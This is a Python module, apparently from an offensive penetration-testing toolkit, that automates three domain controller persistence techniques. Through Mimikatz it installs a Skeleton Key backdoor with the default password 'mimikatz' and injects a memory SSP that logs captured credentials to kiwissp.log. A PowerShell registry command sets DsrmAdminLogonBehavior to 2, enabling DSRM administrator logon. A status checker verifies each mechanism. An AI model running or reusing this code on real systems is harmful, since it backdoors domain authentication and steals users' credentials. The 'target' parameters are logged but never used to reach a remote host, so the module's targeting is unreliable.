"""
Implementation of system-level persistence mechanisms.
Includes Skeleton Key, Custom SSP, and DSRM modifications.
"""

from .persistence_base import PersistenceBase
from typing import Optional, Dict
import subprocess
import os

class SystemPersistence(PersistenceBase):
    def __init__(self):
        """Initialize system persistence module"""
        super().__init__()
        
    def install_skeleton_key(self, target: str, username: str, 
                           password: str) -> bool:
        """
        Install Skeleton Key using Mimikatz
        
        Args:
            target: Target DC hostname/IP
            username: Username with admin rights
            password: Password for authentication
            
        Returns:
            bool indicating success/failure
        """
        try:
            # Run mimikatz commands
            cmds = [
                "privilege::debug",
                "misc::skeleton",
                "exit"
            ]
            
            cmd = [
                'mimikatz.exe',
                *cmds
            ]
            
            self.log_status(f"Installing Skeleton Key on {target}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Key installed" in result.stdout:
                self.log_success("Skeleton Key installed successfully")
                
                # Log persistence
                self.log_persistence('skeleton_key', {
                    'target': target,
                    'username': username,
                    'password': 'mimikatz'  # Default skeleton key password
                })
                return True
                
            self.log_error("Failed to install Skeleton Key")
            return False
            
        except Exception as e:
            self.log_error(f"Skeleton Key installation failed: {str(e)}")
            return False
            
    def install_custom_ssp(self, target: str) -> bool:
        """
        Install custom Security Support Provider for credential capture
        
        Args:
            target: Target DC hostname/IP
            
        Returns:
            bool indicating success/failure
        """
        try:
            # Run mimikatz commands
            cmds = [
                "privilege::debug",
                "misc::memssp",
                "exit"
            ]
            
            cmd = [
                'mimikatz.exe',
                *cmds
            ]
            
            self.log_status(f"Installing custom SSP on {target}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "SSP installed" in result.stdout:
                self.log_success("Custom SSP installed successfully")
                self.log_status("Credentials will be logged to: C:\\Windows\\System32\\kiwissp.log")
                
                # Log persistence
                self.log_persistence('custom_ssp', {
                    'target': target,
                    'log_file': 'C:\\Windows\\System32\\kiwissp.log'
                })
                return True
                
            self.log_error("Failed to install custom SSP")
            return False
            
        except Exception as e:
            self.log_error(f"Custom SSP installation failed: {str(e)}")
            return False
            
    def modify_dsrm_behavior(self, target: str) -> bool:
        """
        Modify DSRM behavior to allow local logon
        
        Args:
            target: Target DC hostname/IP
            
        Returns:
            bool indicating success/failure
        """
        try:
            # PowerShell command to modify registry
            ps_cmd = (
                'New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" '
                '-Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD'
            )
            
            cmd = [
                'powershell.exe',
                '-Command',
                ps_cmd
            ]
            
            self.log_status(f"Modifying DSRM behavior on {target}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "PropertyType" in result.stdout:
                self.log_success("DSRM behavior modified successfully")
                
                # Log persistence
                self.log_persistence('dsrm', {
                    'target': target,
                    'registry_key': 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior',
                    'value': 2
                })
                return True
                
            self.log_error("Failed to modify DSRM behavior")
            return False
            
        except Exception as e:
            self.log_error(f"DSRM modification failed: {str(e)}")
            return False
            
    def check_persistence_status(self, target: str, mechanism: str) -> Dict:
        """
        Check status of installed persistence mechanism
        
        Args:
            target: Target system to check
            mechanism: Type of persistence to check
            
        Returns:
            Dict containing status information
        """
        try:
            status = {}
            
            if mechanism == 'skeleton_key':
                # Check for skeleton key
                cmd = ['mimikatz.exe', 'privilege::debug', 'misc::skeleton', 'exit']
                result = subprocess.run(cmd, capture_output=True, text=True)
                status['installed'] = "Key installed" in result.stdout
                
            elif mechanism == 'custom_ssp':
                # Check for SSP log file
                log_path = 'C:\\Windows\\System32\\kiwissp.log'
                status['installed'] = os.path.exists(log_path)
                if status['installed']:
                    status['log_size'] = os.path.getsize(log_path)
                    
            elif mechanism == 'dsrm':
                # Check registry value
                ps_cmd = (
                    'Get-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" '
                    '-Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue'
                )
                cmd = ['powershell.exe', '-Command', ps_cmd]
                result = subprocess.run(cmd, capture_output=True, text=True)
                status['installed'] = "2" in result.stdout
                
            return status
            
        except Exception as e:
            self.log_error(f"Status check failed: {str(e)}")
            return {'error': str(e)} 